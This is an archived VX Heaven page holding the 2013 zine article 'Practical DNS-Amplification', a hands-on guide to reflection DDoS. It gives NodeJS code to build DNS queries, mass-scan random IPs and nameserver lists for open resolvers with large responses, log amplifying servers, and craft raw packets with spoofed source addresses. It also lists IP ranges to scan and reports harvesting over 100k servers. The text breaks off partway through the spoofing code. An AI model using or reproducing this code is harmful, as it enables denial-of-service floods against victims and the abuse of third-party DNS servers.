<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> MZh 'Practical DNS-Amplification' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="MZh"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, MZh,Practical DNS-Amplification, root, servers, undefined, server, rinfo, current, packet, require, repeater, socket, function, domain, util, address, diapasons"/>
<meta name="Description" content="Good old DNS-Amplification. Those familiar with the subject could skip a paragraph or even doesn't read this at all."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"5a4ddf04b40e172058e0172e38bab2cdc0e001f8-1498756998-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vmz00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Practical DNS-Amplification</h1><p><a href="/lib/?lang=en&amp;author=MZh"> MZh</a><br/> <em><a href="/vx.php?fid=2013#f2013">Inception #1 (EN)</a></em><br/> <em>October 2013</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vmz00.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=VX#vmz00">Back to index</a>] [<a href="/lib/vmz00.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">Looking for vulnerable servers.</a></li>
<li><a href="#c2">More efficient hosts scanning</a></li>
<li><a href="#c3">Spoofing part</a></li>
<li><a href="#c4">Where to get IP addresses?</a></li>
</ul>
<h2>Part 0</h2>
<p>Good old <em>DNS-Amplification</em>. Those familiar with the subject could skip a paragraph or even doesn't read this at all.</p>
<p>Attack principle is pretty simple. Every <em>nameserver</em> responds to anything. If there's an IP address present into packet header, NS responds to that IP.</p>
<p>The sense of amplification is to achieve request packet size closer to respondse packet size.
Most overused method is to <em>query domain "." DNS</em> responds with massive packet containing several root DNS records. It looks like this:</p>
<pre class="source">
length 540
    209.160.35.110.domain   46.4.179.132.50723: [udp sum ok] 3- q: AAAA? . 0/13/14
    ns:
     . NS f.root-servers.net.,
     . NS g.root-servers.net.,
     . NS h.root-servers.net.,
     . NS i.root-servers.net.,
     . NS j.root-servers.net.,
     . NS k.root-servers.net.,
     . NS l.root-servers.net.,
     . NS m.root-servers.net.,
     . NS a.root-servers.net.,
     . NS b.root-servers.net.,
     . NS c.root-servers.net.,
     . NS d.root-servers.net.,
     . NS e.root-servers.net.
 ar:
  a.root-servers.net. A 198.41.0.4,
  a.root-servers.net. AAAA 2001:503:ba3e::2:30,
  b.root-servers.net. A 192.228.79.201,
  c.root-servers.net. A 192.33.4.12,
  d.root-servers.net. A 199.7.91.13,
  d.root-servers.net. AAAA 2001:500:2d::d,
  e.root-servers.net. A 192.203.230.10,
  f.root-servers.net. A 192.5.5.241,
  f.root-servers.net. AAAA 2001:500:2f::f,
  g.root-servers.net. A 192.112.36.4,
  h.root-servers.net. A 128.63.2.53,
  h.root-servers.net. AAAA 2001:500:1::803f:235,
  i.root-servers.net. A 192.36.148.17,
  i.root-servers.net. AAAA 2001:7fe::53

 (512)
</pre>
<p>As we could see, response extends 500 bytes. That's very much, considering the request was only 17 bytes (not counting IP/UDP headers). Normally, attacking requires servers with largest response packets. There are not so many DNS's good enough, as the attack is old as the world can be, and there's many solutions to prevent this vulnerability from being exploited. That's covered in article's final part.</p>
<h2><a name="c1"></a>Looking for vulnerable servers.</h2>
<p>Attacker would need a server with enough bandwidth and hosting company being loyal to good outgoing UDP flow. It's better to scan with fast code, written in native languages. I used <em>NodeJS</em> as resolving lags overlaps time consumed to run the code. If theresn't enough performance, node could be executed as a cluster with over 9000 children. The idea is simple - send the packets and watch the responses. Packets could be sent to random host:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000066; font-weight: bold;">var</span> ip <span style="color: #339933;">=</span> <span style="color: black;">&#91;</span>rand<span style="color: black;">&#40;</span><span style="color: #CC0000;">255</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> rand<span style="color: black;">&#40;</span><span style="color: #CC0000;">255</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> rand<span style="color: black;">&#40;</span><span style="color: #CC0000;">255</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> rand<span style="color: black;">&#40;</span><span style="color: #CC0000;">255</span><span style="color: black;">&#41;</span><span style="color: black;">&#93;</span>.<span style="color: #660066;">join</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'.'</span><span style="color: black;">&#41;</span><br/>
sendPacket<span style="color: black;">&#40;</span>ip<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>as well as choosing target hosts more precisely. To speed up the scanning it is advised to get nameservers list, as large as possible. One would need a big (over 1-2 mln) list of any domains. As domain is taken from the list, DNS record is requested for that domain. Response would contain list of DNS's providing name resolution for that domain. These DNS's added to testing list.</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000066; font-weight: bold;">var</span> dns <span style="color: #339933;">=</span> require<span style="color: black;">&#40;</span><span style="color: #3366CC;">'dns'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
dns.<span style="color: #660066;">resolveNs</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'google.com'</span><span style="color: #339933;">,</span> <span style="color: #000066; font-weight: bold;">function</span> <span style="color: black;">&#40;</span>err<span style="color: #339933;">,</span> addresses<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span>err<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; addresses.<span style="color: #660066;">forEach</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">function</span> <span style="color: black;">&#40;</span>a<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp;sendPacket<span style="color: black;">&#40;</span>a<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Now the fun part - send DNS packet:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000066; font-weight: bold;">var</span> ns_packet <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> Buffer<span style="color: black;">&#40;</span><span style="color: black;">&#91;</span><br/>
&nbsp; &nbsp; <span style="color: black; font-style: italic;">//---- стандартный заголовок -----</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x03<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">// Айди запроса</span><br/>
&nbsp; &nbsp; 0x01<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">// Флаги</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x01<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">// Число запросов : 1</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">// Число ответов : 0</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">// Число авторизованных записей</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">// Число дополнительных записей</span><br/>
&nbsp; &nbsp; <span style="color: black; font-style: italic;">//---- тело запроса -----</span><br/>
&nbsp; &nbsp; <span style="color: black; font-style: italic;">// запись АААА для &quot;.&quot;</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; 0x1C<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; 0x01<br/>
<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Code:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000066; font-weight: bold;">var</span> client <span style="color: #339933;">=</span> dgram.<span style="color: #660066;">createSocket</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'udp4'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> sendPacket<span style="color: black;">&#40;</span>ip<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp;client.<span style="color: #660066;">send</span><span style="color: black;">&#40;</span>ns_packet<span style="color: #339933;">,</span> <span style="color: #CC0000;">0</span><span style="color: #339933;">,</span> ns_packet.<span style="color: #660066;">length</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">53</span><span style="color: #339933;">,</span> ip<span style="color: #339933;">,</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: black;">&#40;</span>err<span style="color: #339933;">,</span> bytes<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; console.<span style="color: #660066;">log</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'sent %d bytes'</span><span style="color: #339933;">,</span> bytes<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
client.<span style="color: #660066;">on</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'error'</span><span style="color: #339933;">,</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: black;">&#40;</span>msg<span style="color: #339933;">,</span> rinfo<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp;console.<span style="color: #660066;">log</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'client error'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
client.<span style="color: #660066;">on</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'message'</span><span style="color: #339933;">,</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: black;">&#40;</span>msg<span style="color: #339933;">,</span> rinfo<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>msg.<span style="color: #660066;">length</span> <span style="color: #339933;">&gt;</span> <span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; console.<span style="color: #660066;">log</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;%d bytes from %s:%d&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp;msg.<span style="color: #660066;">length</span><span style="color: #339933;">,</span> rinfo.<span style="color: #660066;">address</span><span style="color: #339933;">,</span> rinfo.<span style="color: #660066;">port</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Thus, we managed to collect more than 100k servers, which answer with packages in 1/2 kb, in just a few hours.</p>
<h2>Part 1</h2>
<h2><a name="c2"></a>More efficient hosts scanning</h2>
<p>Previously described step restricts from rapid increase in power due to:</p>
<ul>
<li>if DNS reponded to YOUR direct request, this doen't mean DNS surely gets packet with spoofed IP; </li>
<li>scanning from a single host uses both upstream and downstream bandwidth so there's some packet loss in DNS responses.</li>
</ul>
<p>More efficient approach is to scan from 2 servers, one dedicated to receiving packets from DNS, while another sends spoofed IP packets to DNS. It is mandatory that servers must be allocated in different data-centers, different countries preferred. There may be one or several spoofing servers. I checked with 2 spoofing and one receiving servers.</p>
<p><em>NodeJS</em> applications are used to receive and send packets. Let's call receiving side the <em>"client".</em> It is crucially simplified. Functional example:</p>
<ul>
<li>create UDP server listening 5353 port <em>(dgram.createSocket("udp4") \ server.bind(5353);)</em></li>
<li>incoming packets sorted by size;</li>
<li>If packet size fits (over 200-300 bytes), source host is written to a log <em>(fs.createWriteStream \ write);</em></li>
</ul>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000066; font-weight: bold;">var</span> dgram <span style="color: #339933;">=</span> require<span style="color: black;">&#40;</span><span style="color: #3366CC;">'dgram'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #000066; font-weight: bold;">var</span> fs <span style="color: #339933;">=</span> require<span style="color: black;">&#40;</span><span style="color: #3366CC;">'fs'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #000066; font-weight: bold;">var</span> dns <span style="color: #339933;">=</span> require<span style="color: black;">&#40;</span><span style="color: #3366CC;">'dns'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #000066; font-weight: bold;">var</span> util <span style="color: #339933;">=</span> require<span style="color: black;">&#40;</span><span style="color: #3366CC;">'util'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">var</span> ws <span style="color: #339933;">=</span> fs.<span style="color: #660066;">createWriteStream</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;incoming_ips.txt&quot;</span><span style="color: #339933;">,</span> <span style="color: black;">&#123;</span><br/>
&nbsp;flags<span style="color: #339933;">:</span> <span style="color: #3366CC;">'w+'</span><br/>
<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">var</span> server <span style="color: #339933;">=</span> dgram.<span style="color: #660066;">createSocket</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;udp4&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> getPercent<span style="color: black;">&#40;</span>total<span style="color: #339933;">,</span> amount<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">return</span> <span style="color: black;">&#40;</span>amount <span style="color: #339933;">*</span> <span style="color: #CC0000;">100</span><span style="color: black;">&#41;</span> <span style="color: #339933;">/</span> total<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
server.<span style="color: #660066;">on</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'error'</span><span style="color: #339933;">,</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: black;">&#40;</span>msg<span style="color: #339933;">,</span> rinfo<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp;console.<span style="color: #660066;">log</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'server error'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
server.<span style="color: #660066;">on</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'message'</span><span style="color: #339933;">,</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: black;">&#40;</span>msg<span style="color: #339933;">,</span> rinfo<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp;<span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>msg.<span style="color: #660066;">length</span> <span style="color: #339933;">&gt;</span> <span style="color: #CC0000;">100</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #000066; font-weight: bold;">var</span> line <span style="color: #339933;">=</span> util.<span style="color: #660066;">format</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;%d:%s:%d:%d&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp;msg.<span style="color: #660066;">length</span><span style="color: #339933;">,</span> rinfo.<span style="color: #660066;">address</span><span style="color: #339933;">,</span> rinfo.<span style="color: #660066;">port</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp;getPercent<span style="color: black;">&#40;</span><span style="color: #CC0000;">17</span><span style="color: #339933;">,</span> msg.<span style="color: #660066;">length</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; console.<span style="color: #660066;">log</span><span style="color: black;">&#40;</span>line<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; ws.<span style="color: #660066;">write</span><span style="color: black;">&#40;</span>line <span style="color: #339933;">+</span> <span style="color: #3366CC;">'n'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
server.<span style="color: #660066;">bind</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">5353</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
console.<span style="color: #660066;">log</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">'NS Client started'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>This code will capture all of our logged packets, and the log would be parser friendly. A separate server would be introduced as a string: <em>packet_size:DNS_IP:amplification_ratio</em></p>
<h2><a name="c3"></a>Spoofing part</h2>
<p>Spoofing part is coded using <em>node-raw-socket</em> UNIX-sockets wrapper for *nix that allows to craft custom IP headers for outgoing packets. Of course this requires root priveleges. The principle is simple. We have crafted DNS request packet, along with IP header and UDP packet with <em>DNS-query</em> payload:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000066; font-weight: bold;">var</span> buffer <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> Buffer <span style="color: black;">&#40;</span><span style="color: black;">&#91;</span><br/>
&nbsp;<span style="color: black; font-style: italic;">//--------- IP packet ----------</span><br/>
&nbsp;0x45<span style="color: #339933;">,</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x25<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//length</span><br/>
&nbsp;0x7c<span style="color: #339933;">,</span> 0x9b<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//ID</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//flagsfragment offset</span><br/>
&nbsp;0x80<span style="color: #339933;">,</span> &nbsp;<span style="color: black; font-style: italic;">//TTL</span><br/>
&nbsp;0x11<span style="color: #339933;">,</span> &nbsp;<span style="color: black; font-style: italic;">//protocol</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//crc</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//source IP</span><br/>
&nbsp;0xc0<span style="color: #339933;">,</span> 0xa8<span style="color: #339933;">,</span> 0x41<span style="color: #339933;">,</span> 0x01<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//dest IP</span><br/>
&nbsp;<span style="color: black; font-style: italic;">//--------- 8 bytes &nbsp;of UDP packet ----------</span><br/>
&nbsp;0x14<span style="color: #339933;">,</span> 0xE9<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//sender port</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x35<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//target port</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x19<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//data length</span><br/>
&nbsp;0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: black; font-style: italic;">//crc</span><br/>
&nbsp;<span style="color: black; font-style: italic;">//--------- 17 bytes of DNS packet ----------</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x03<span style="color: #339933;">,</span> 0x01<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span>0x01<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; 0x1C<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x01<br/>
<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>All we need is to insert addresses into IP header: </p>
<ul>
<li><em>src_ip</em> - packet receiver IP (client)</li>
<li><em>dst_ip</em> - potentially vulnerable DNS IP</li>
</ul>
<p>Source port 5353 used in UDP packet is the same port client listens to. Checksums are set to 0 for OS stack to recalculate checksums while sending packets.</p>
<h2><a name="c4"></a>Where to get IP addresses?</h2>
<p>Random generated numbers shows good results, and it's possible to scan countries' ranges. I took listed ranges:</p>
<pre class="source">
3.0.0.0-3.103.8.36
3.103.8.38-4.18.65.255
4.18.68.0-4.28.83.255
4.28.85.0-4.31.64.63
4.31.64.72-4.59.175.255
4.59.177.0-4.68.23.139
4.68.23.141-4.68.23.189
4.68.23.191-4.68.25.1
4.68.25.4-4.68.115.255
4.68.118.0-4.69.131.255
4.69.132.53-4.69.132.53
4.69.132.61-4.69.132.61
4.69.132.65-4.69.132.65
</pre>
<p>and explored them subsequently. It is important to provide subsequent packet flow on asynchronous architecture. To ensure this a spike was made proven rather stable, loading 20 megabits of 100 available and not blocking node's event pool. A shortened spike:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000066; font-weight: bold;">function</span> repeater<span style="color: black;">&#40;</span>diapasons<span style="color: #339933;">,</span> nextIp <span style="color: #339933;">,</span> endIp<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp;async<span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">function</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; process.<span style="color: #660066;">nextTick</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">function</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp;repeater<span style="color: black;">&#40;</span>diapasons<span style="color: #339933;">,</span> current_ip <span style="color: #339933;">+</span> <span style="color: #CC0000;">1</span><span style="color: #339933;">,</span> endIp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
repeater<span style="color: black;">&#40;</span><span style="color: #003366; font-weight: bold;">undefined</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">undefined</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">undefined</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>It requires raw-socket module to execute: <em>npm install raw-socket</em> Spoofing part code:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000066; font-weight: bold;">var</span> raw <span style="color: #339933;">=</span> require <span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;raw-socket&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #000066; font-weight: bold;">var</span> fs <span style="color: #339933;">=</span> require<span style="color: black;">&#40;</span><span style="color: #3366CC;">'fs'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #000066; font-weight: bold;">var</span> dns <span style="color: #339933;">=</span> require<span style="color: black;">&#40;</span><span style="color: #3366CC;">'dns'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #000066; font-weight: bold;">var</span> util <span style="color: #339933;">=</span> require<span style="color: black;">&#40;</span><span style="color: #3366CC;">'util'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">var</span> options <span style="color: #339933;">=</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; protocol<span style="color: #339933;">:</span> raw.<span style="color: #660066;">Protocol</span>.<span style="color: #660066;">UDP</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; bufferSize<span style="color: #339933;">:</span> <span style="color: #CC0000;">4096</span><span style="color: #339933;">*</span><span style="color: #CC0000;">8</span><br/>
<span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">var</span> socket <span style="color: #339933;">=</span> raw.<span style="color: #660066;">createSocket</span> <span style="color: black;">&#40;</span>options<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
socket.<span style="color: #660066;">setOption</span> <span style="color: black;">&#40;</span>raw.<span style="color: #660066;">SocketLevel</span>.<span style="color: #660066;">IPPROTO_IP</span><span style="color: #339933;">,</span><br/>
raw.<span style="color: #660066;">SocketOption</span>.<span style="color: #660066;">IP_HDRINCL</span><span style="color: #339933;">,</span> <span style="color: #000066; font-weight: bold;">new</span> Buffer <span style="color: black;">&#40;</span><span style="color: black;">&#91;</span>0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x01<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<br/>
